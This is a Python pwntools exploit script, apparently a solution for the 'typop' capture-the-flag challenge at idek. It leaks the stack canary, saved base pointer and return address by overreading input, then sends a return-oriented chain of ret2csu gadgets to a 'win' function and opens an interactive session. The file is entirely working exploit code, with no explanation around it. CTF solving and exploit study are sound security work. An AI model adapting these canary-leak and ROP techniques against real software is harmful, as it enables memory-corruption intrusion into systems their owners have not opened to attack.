from pwn import *
#io = process('./chall')
#gdb.attach(io, api=True)

io = remote('typop.chal.idek.team', 1337)

#Gadget (offset from original return address)
ret = 0x0000000000001447 #Original return address for ref
win_off = -510
pop_rdi_off = 140
pop_rsi_pop_r15_off = 138
main_off = -55
csu1_off = 131
csu2_off = 105

#Leak canary
io.recvuntil(b'survey?')
io.sendline(b'y')
io.recvuntil(b'ctf?')
io.send(b'a'*11)
print(io.recvline())
canary = io.recv(28)[21:28]
canary = b'\0' + canary
print(b"Canary = ", hex(u64(canary)))
print(b'Length = ', len(canary))
io.recvuntil(b'feedback?')
io.send(b'a'*10 + canary) #Return normal

#Leak rbp
io.recvuntil(b'survey?')
io.sendline(b'y')
io.recvuntil(b'ctf?')
io.send(b'a'*18)
print(io.recvline())
#o.interactive()
rbp = u64(io.recv(34)[28:].ljust(8, b'\0'))
print(b"Rbp = ", hex(rbp))
io.recvuntil(b'feedback?')
io.send(b'a'*10 + canary) #Return normal

#Leak return address
io.recvuntil(b'survey?')
io.sendline(b'y')
io.recvuntil(b'ctf?')
io.send(b'a'*26)
print('here')
print(io.recvline())
ret_addr = u64(io.recv(42)[36:].ljust(8, b'\0'))
print('Return address = ', hex(ret_addr))
io.send(b'a'*2 + p64(ret_addr + win_off) + canary + p64(ret_addr + win_off) + p64(ret_addr + csu1_off) + p64(0) + p64(0) + p64(0x66) + p64(0x6c) + p64(0x61) + p64(rbp-0x20) + p64(ret_addr + csu2_off))


io.interactive()